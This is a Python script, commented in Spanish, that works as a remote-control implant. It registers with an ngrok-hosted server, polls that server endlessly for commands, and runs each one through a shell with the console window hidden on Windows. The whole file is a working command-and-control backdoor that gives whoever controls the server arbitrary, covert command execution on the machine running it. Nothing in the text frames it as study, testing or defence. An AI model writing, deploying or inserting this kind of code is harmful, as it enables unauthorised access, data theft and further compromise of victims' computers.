import requests
import subprocess
import time

current_id = None

def get_client_id():
    global current_id
    response = requests.get("https://flexible-elk-monthly.ngrok-free.app/get_client_id")
    data = response.json()
    current_id = int(data.get('clients_id', 'No client_id found'))
    print(f'Nuevo client_id obtenido: {current_id}')

def fetch_data():
    global current_id
    url = f'https://flexible-elk-monthly.ngrok-free.app/fetch_data/{current_id}'
    
    try:
        response = requests.get(url)
        
        # Verificar si la respuesta es HTML (se espera JSON)
        if "text/html" in response.headers.get("Content-Type", ""):
            raise ValueError("Se recibió HTML en lugar de JSON")  # Lanza excepción para activar el retry
        
        if response.status_code == 200:
            data = response.json()  # Intentar cargar la respuesta como JSON
            print('Respuesta del servidor:', data)

            command = data.get('command', 'No command')
            run_command(command)
        else:
            # Esperar 5 segundos antes de reintentar si hay una respuesta negativa
            print(f'Respuesta negativa del servidor: {response.status_code} - {response.text}. Esperando 5 segundos antes de reintentar...')
            time.sleep(5)
            
    except requests.RequestException as e:
        # Para errores de red o solicitudes, solo imprimimos el error
        print(f"Error en la solicitud: {e}")
    except ValueError as ve:
        # Solo lanzar la excepción si recibimos HTML en lugar de JSON
        raise ve

def run_command(command):
    print(f"Ejecutando comando: {command}")
    try:
        subprocess.Popen(
            command,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW  # Oculta la ventana en Windows
        )
    except Exception as e:
        print(f"Error al ejecutar el comando: {e}")

# Lógica de reintento, si hay error en fetch_data, reobtiene client_id solo si se recibe HTML
def retry_function(func, delay=5, reget_client_id=False):
    while True:
        try:
            func()  # Ejecutar la función (get_client_id o fetch_data)
            break  # Si la función se ejecuta sin problemas, salimos del bucle
        except ValueError as ve:
            # Si la excepción es por recibir HTML, generamos un nuevo client_id
            print(f"Error HTML: {ve}. Reintentando obtener un nuevo client_id...")
            if reget_client_id:
                retry_function(get_client_id)  # Genera un nuevo client_id y reintenta fetch_data
        except Exception as e:
            # Para cualquier otro error, solo imprimir y esperar antes de reintentar
            print(f"Error: {e}. Reintentando en {delay} segundos...")
        time.sleep(delay)  # Espera antes de intentar nuevamente

if __name__ == '__main__':
    # Primero obtener client_id
    retry_function(get_client_id)
    
    # Iniciar fetch_data en un ciclo continuo, reintenta obtener nuevo client_id solo si recibe HTML
    while True:
        retry_function(fetch_data, reget_client_id=True)